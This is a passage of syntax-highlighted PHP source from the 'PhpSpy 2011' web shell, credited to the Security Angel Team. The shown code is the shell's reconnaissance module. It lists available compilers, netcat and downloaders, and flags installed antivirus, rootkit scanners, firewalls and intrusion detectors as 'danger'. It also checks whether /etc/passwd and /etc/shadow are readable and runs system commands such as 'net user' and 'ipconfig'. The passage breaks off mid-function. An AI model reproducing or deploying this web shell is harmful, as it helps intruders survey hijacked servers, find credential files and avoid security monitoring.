#ffcc66;\">userful<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'gcc'<\/span>,<span style=\"color: #66cccc;\">'lcc'<\/span>,<span style=\"color: #66cccc;\">'cc'<\/span>,<span style=\"color: #66cccc;\">'ld'<\/span>,<span style=\"color: #66cccc;\">'make'<\/span>,<span style=\"color: #66cccc;\">'php'<\/span>,<span style=\"color: #66cccc;\">'perl'<\/span>,<span style=\"color: #66cccc;\">'python'<\/span>,<span style=\"color: #66cccc;\">'rub<\/span><span style=\"color: #66cccc; text-decoration: underline;\">y'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'tar'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'gzip'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'bzip'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'bzip2'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'nc'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'locate'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'suidperl'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">danger<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'kav'<\/span>,<span style=\"color: #66cccc;\">'nod32'<\/span>,<span style=\"color: #66cccc;\">'bdcored'<\/span>,<span style=\"color: #66cccc;\">'uvscan'<\/span>,<span style=\"color: #66cccc;\">'sav'<\/span>,<span style=\"color: #66cccc;\">'drwebd'<\/span>,<span style=\"color: #66cccc;\">'clamd'<\/span>,<span style=\"color: #66cccc; text-decoration: underline;\">'rkhunter'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'chkrootkit'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'iptables'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'ipfw'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'tripwire'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'shieldcc'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'portsentry'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'snort'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'ossec'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'lidsadm'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'tcplodg'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'sxid'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'logcheck'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'logwatch'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'sysmask'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'zmbscap'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'sawmill'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'wormscan'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'ninja'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">downloaders<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'wget'<\/span>,<span style=\"color: #66cccc;\">'fetch'<\/span>,<span style=\"color: #66cccc;\">'lynx'<\/span>,<span style=\"color: #66cccc;\">'links'<\/span>,<span style=\"color: #66cccc;\">'curl'<\/span>,<span style=\"color: #66cccc;\">'get'<\/span>,<span style=\"color: #66cccc;\">'lwp-mir<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ror'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Readable \/etc\/passwd'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_readable(<\/span><span style=\"color: #66cccc;\">'\/etc\/passwd'<\/span>) ? <span style=\"color: #66cccc;\">\"yes\"<\/span> : <span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">no'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Readable \/etc\/shadow'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_readable(<\/span><span style=\"color: #66cccc;\">'\/etc\/shadow'<\/span>) ? <span style=\"color: #66cccc;\">\"yes\"<\/span> : <span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">no'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'OS version'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span><span style=\"color: #66cccc;\">'\/proc\/version'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Distr name'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span><span style=\"color: #66cccc;\">'\/etc\/issue.net'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">safe_mode<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ini_get(<\/span><span style=\"color: #66cccc;\">'safe_mode'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #6699cc;\">GLOBALS<\/span>[<span style=\"color: #66cccc;\">'safe_mode'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">userful<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">item<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">which(<\/span>$<span style=\"color: #ffcc66;\">item<\/span>)){$<span style=\"color: #ffcc66;\">temp<\/span>[]=$<span style=\"color: #ffcc66;\">item<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Userful'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">', '<\/span>,$<span style=\"color: #ffcc66;\">temp<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">danger<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">item<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">which(<\/span>$<span style=\"color: #ffcc66;\">item<\/span>)){$<span style=\"color: #ffcc66;\">temp<\/span>[]=$<span style=\"color: #ffcc66;\">item<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Danger'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">', '<\/span>,$<span style=\"color: #ffcc66;\">temp<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">downloaders<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">item<\/span>)<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">which(<\/span>$<span style=\"color: #ffcc66;\">item<\/span>)){$<span style=\"color: #ffcc66;\">temp<\/span>[]=$<span style=\"color: #ffcc66;\">item<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Downloaders'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">', '<\/span>,$<span style=\"color: #ffcc66;\">temp<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Hosts'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span><span style=\"color: #66cccc;\">'\/etc\/hosts'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'HDD space'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'df -h'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Mount options'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span><span style=\"color: #66cccc;\">'\/etc\/fstab'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'OS Version'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'ver'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Account Settings'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'net accounts'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'User Accounts'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'net user'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'IP Configurate'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'ipconfig -all'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   }\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end<\/span>\n\n<span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Undefined Action'<\/span>);\n}\n\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/td&gt;&lt;\/tr&gt;&lt;\/table&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;div<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">background:#eee;\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;span<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"float:right;\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">debuginfo(<\/span>);<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_end_flush(<\/span>);<span style=\"color: #cc99cc;\">?&gt;<\/span><span style=\"color: #6699cc;\">&lt;\/span&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">Powered<\/span> <span style=\"color: #f2777a; font-weight: bold;\">by<\/span> <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">title=<\/span><span style=\"color: #66cccc;\">\"Build 20110502\"<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"http:\/\/www.4ngel.net\"<\/span> <span style=\"color: #6699cc;\">target=<\/span><span style=\"color: #66cccc;\">\"_bl<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ank\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #99cc99; text-decoration: underline;\">echo<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">str_replace(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'.'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'P.h.p.S.p.y'<\/span><span style=\"text-decoration: underline;\">);<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2011<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/a&gt;<\/span><span style=\"text-decoration: underline;\">. <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">Copyright (<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">C<\/span><span style=\"text-decoration: underline;\">) <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2004<\/span><span style=\"text-decoration: underline;\">-<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2011<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;a<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">href=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"http:\/\/www.4ngel.net\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">target=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"_blank\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">Security<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">Angel<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">Team [<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">S4T<\/span><span style=\"text-decoration: underline;\">]<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/a&gt;<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">All<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">Rights<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">Reserved<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"color: #6699cc;\">&lt;\/div&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/body&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/html&gt;<\/span>\n\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">======================================================<\/span>\n<span style=\"color: #999999; font-style: italic;\">&#20989;&#25968;&#24211;<\/span>\n<span style=\"color: #999999; font-style: italic;\">======================================================*\/<\/span>\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">secparam<\/span>($<span style=\"color: #ffcc66;\">n<\/span>, $<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">v<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">trim(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;'<\/span>.$<span style=\"color: #ffcc66;\">n<\/span>.<span style=\"color: #66cccc;\">' &amp;raquo;&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;div class=\"infolist\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">strpos(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>, <span style=\"color: #66cccc;\">\"\\n\"<\/span>) === <span style=\"color: #6699cc;\">false<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>.<span style=\"color: #66cccc;\">'&lt;br \/&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;pre&gt;'<\/span>.$<span style=\"color: #ffcc66;\">v<\/span>.<span style=\"color: #66cccc;\">'&lt;\/pre&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/div&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">m<\/span>($<span style=\"color: #ffcc66;\">msg<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">'&lt;div style=\"margin:10px auto 15px auto;background:#ffffe0;border:1px s<\/span><span style=\"color: #66cccc; text-decoration: underline;\">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;\"&gt;'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">msg<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">'&lt;\/div&gt;'<\/span>;\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">scookie<\/span>($<span style=\"color: #ffcc66;\">key<\/span>, $<span style=\"color: #ffcc66;\">value<\/span>, $<span style=\"color: #ffcc66;\">life<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>, $<span style=\"color: #ffcc66;\">prefix<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">timestamp<\/span>, $<span style=\"color: #6699cc;\">_SERVER<\/span>, $<span style=\"color: #ffcc66;\">cookiepre<\/span>, $<span style=\"color: #ffcc66;\">cookiedomain<\/span>, $<span style=\"color: #ffcc66;\">cookiepath<\/span>, $<span style=\"color: #ffcc66;\">cookie<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">life<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">key<\/span> = ($<span style=\"color: #ffcc66;\">prefix<\/span> ? $<span style=\"color: #ffcc66;\">cookiepre<\/span> : <span style=\"color: #66cccc;\">''<\/span>).$<span style=\"color: #ffcc66;\">key<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">life<\/span> = $<span style=\"color: #ffcc66;\">life<\/span> ? $<span style=\"color: #ffcc66;\">life<\/span> : $<span style=\"color: #ffcc66;\">cookielife<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">useport<\/span> = $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_PORT'<\/span>] == <span style=\"color: #cccccc; background-color: #2d2d2d;\">443<\/span> ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">setcookie(<\/span>$<span style=\"color: #ffcc66;\">key<\/span>, $<span style=\"color: #ffcc66;\">value<\/span>, $<span style=\"color: #ffcc66;\">timestamp<\/span>+$<span style=\"color: #ffcc66;\">life<\/span>, $<span style=\"color: #ffcc66;\">cookiepath<\/span>, $<span style=\"color: #ffcc66;\">cookiedomain<\/span>, $<span style=\"color: #ffcc66;\">usepo<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rt<\/span><span style=\"text-decoration: underline;\">);<\/span>\n}<span style=\"color: #f2777a; background-color: #515151;\">   <\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">multi<\/span>($<span style=\"color: #ffcc66;\">num<\/span>, $<span style=\"color: #ffcc66;\">perpage<\/span>, $<span style=\"color: #ffcc66;\">curpage<\/span>, $<span style=\"color: #ffcc66;\">tablename<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">num<\/span> &gt; $<span style=\"color: #ffcc66;\">perpage<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">page<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">offset<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pages<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ceil(<\/span>$<span style=\"color: #ffcc66;\">num<\/span> \/ $<span style=\"color: #ffcc66;\">perpage<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">page<\/span> &gt; $<span style=\"color: #ffcc66;\">pages<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">from<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">to<\/span> = $<span style=\"color: #ffcc66;\">pages<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">from<\/span> = $<span style=\"color: #ffcc66;\">curpage<\/span> - $<span style=\"color: #ffcc66;\">offset<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">to<\/span> = $<span style=\"color: #ffcc66;\">curpage<\/span> + $<span style=\"color: #ffcc66;\">page<\/span> - $<span style=\"color: #ffcc66;\">offset<\/span> - <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">from<\/span> &lt; <span 